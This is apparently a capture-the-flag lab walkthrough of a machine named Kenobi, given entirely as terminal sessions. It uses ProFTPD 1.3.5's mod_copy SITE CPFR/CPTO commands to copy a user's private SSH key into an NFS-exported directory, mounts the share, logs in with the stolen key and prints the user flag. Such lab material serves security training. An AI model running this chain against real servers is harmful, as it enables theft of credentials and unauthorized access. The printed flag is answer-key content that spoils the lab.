
```Bash
root@ip-10-10-7-66:~# nc 10.10.156.18 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.156.18]
```

```Bash
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.156.18]
^C
root@ip-10-10-7-66:~# 
```

```Bash
root@ip-10-10-7-66:~# searchsploit ProFTPD 1.3.5
[i] Found (#2): /opt/searchsploit/files_exploits.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/searchsploit/files_shellcodes.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Me | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execut | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                        | linux/remote/36742.txt
------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```Bash
root@ip-10-10-171-85:~# nc 10.10.42.141 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.42.141]
```

```Bash
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.42.141]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

```Bash
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.42.141]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
^C
root@ip-10-10-171-85:~#
```

```Bash
root@ip-10-10-171-85:~# mkdir /mnt/kenobiNFS
```

```Bash
root@ip-10-10-171-85:~# mount 10.10.42.141:/var /mnt/kenobiNFS
```

```Bash
root@ip-10-10-171-85:~# ls -la /mnt/kenobiNFS
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Jul 19 04:41 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root lxd   4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Jul 19 04:38 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```

```Bash
root@ip-10-10-171-85:~# cp /mnt/kenobiNFS/tmp/id_rsa .
```

```Bash
root@ip-10-10-171-85:~# sudo chmod 600 id_rsa
```

```Bash
root@ip-10-10-171-85:~# ssh -i id_rsa kenobi@10.10.42.141
The authenticity of host '10.10.42.141 (10.10.42.141)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.42.141' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 
```

```Bash
kenobi@kenobi:~$ whoami
kenobi
```

```Bash
kenobi@kenobi:~$ cat /home/kenobi/user.txt 
d0b0f3f53b6caa532a83915e19224899
```
